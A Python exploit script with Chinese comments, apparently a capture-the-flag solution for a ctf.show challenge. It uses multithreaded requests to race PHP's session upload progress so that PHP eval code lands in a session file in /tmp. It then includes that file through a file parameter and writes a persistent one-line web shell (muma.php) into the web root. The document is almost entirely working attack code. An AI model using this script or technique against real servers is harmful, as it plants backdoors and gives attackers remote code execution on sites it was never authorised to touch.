import requests
import io
import threading


url='http://cf025bc4-6da3-4cdd-b591-1a179c985452.challenge.ctf.show/'
sessionid='ctfshow'
data={
	"1":"file_put_contents('/var/www/html/muma.php','<?php eval($_POST[a]);?>');"
}

'''
post 传递内容可在网站目录下写入一句话木马。
根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
sessionid 可控，所以这里即 /tmp/sess_ctfshow。
这样一旦访问成功，就说明木马植入了
'''


# /tmp/sess_sessionid 中写入一句话木马。
def write(session):
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(
			url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)


# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。
def read(session):
	while True:
		response=session.post(
			url+'?file=/tmp/sess_'+sessionid,
	        data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		# 访问木马文件，如果访问到了就代表竞争成功
		resposne2=session.get(url+'muma.php')
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	# 写入和访问分别设置 5 个线程。
	with requests.session() as session:
		for i in range(5):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(5):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()
